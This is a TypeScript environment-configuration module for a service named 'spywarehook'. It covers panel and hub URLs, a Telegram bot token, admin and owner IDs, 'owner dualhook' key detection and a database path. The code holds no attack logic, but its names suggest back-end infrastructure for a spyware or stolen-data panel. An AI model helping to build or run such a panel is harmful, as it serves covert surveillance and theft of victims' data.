import path from "path";

const PROD_API = "https://spywarehook.org";
const PROD_UI = "https://spywarehook.com";

export function env(name: string, fallback = "") {
  return (process.env[name] ?? fallback).trim();
}

export function panelSecret() {
  const s = env("PANEL_SECRET");
  if (!s || s === "dev-panel-secret-change" || s.length < 24) {
    throw new Error("PANEL_SECRET required (min 24 chars, default forbidden)");
  }
  return s;
}

function loopback(url: string) {
  const u = url.toLowerCase();
  return (
    u.includes("localhost") ||
    u.includes("127.0.0.1") ||
    u.includes("[::1]") ||
    u.startsWith("http://")
  );
}

export function panelBase() {
  const base = env("PANEL_BASE_URL", PROD_API).replace(/\/$/, "");
  if (!base || loopback(base)) return PROD_API;
  return base;
}

export function panelBases() {
  const raw = env("PANEL_BASE_URLS", `${PROD_API},${PROD_UI}`);
  const out: string[] = [];
  const seen = new Set<string>();
  for (const part of raw.split(",")) {
    const b = part.trim().replace(/\/$/, "");
    if (!b || loopback(b) || seen.has(b)) continue;
    seen.add(b);
    out.push(b);
  }
  if (!out.length) return [PROD_API, PROD_UI];
  return out;
}

export function hubPort() {
  const n = Number(env("HUB_PORT", "3001"));
  return Number.isFinite(n) && n > 0 ? n : 3001;
}

export function hubPublicUrl() {
  const custom = env("HUB_URL", PROD_API).replace(/\/$/, "");
  if (custom && !loopback(custom)) return custom;
  return PROD_API;
}

export function botToken() {
  return env("BOT_TOKEN");
}

export function adminIds(): number[] {
  return env("ADMIN_IDS")
    .split(",")
    .map((s) => s.trim())
    .filter((s) => /^\d+$/.test(s))
    .map((s) => Number(s));
}

export function ownerTgId(): number | null {
  const raw = env("OWNER_TG_ID");
  if (!/^\d+$/.test(raw)) return null;
  return Number(raw);
}

export function isOwnerKey(row: {
  key?: string | null;
  tg_id?: number | null;
  note?: string | null;
}) {
  const key = String(row.key || "").trim().toUpperCase();
  if (key.startsWith("NF-OWNR")) return true;
  const note = String(row.note || "").toLowerCase();
  if (note.includes("owner dualhook") || note.trim() === "owner") return true;
  const oid = ownerTgId();
  if (oid != null && row.tg_id != null && Number(row.tg_id) === oid) return true;
  return false;
}

export function firstAdminTg(): number | null {
  const ids = adminIds();
  return ids.length ? ids[0] : null;
}

export function dbPath() {
  const custom = env("BOT_DB_PATH");
  if (custom) return custom;
  return path.join(process.cwd(), "..", "bot", "data", "bot.db");
}
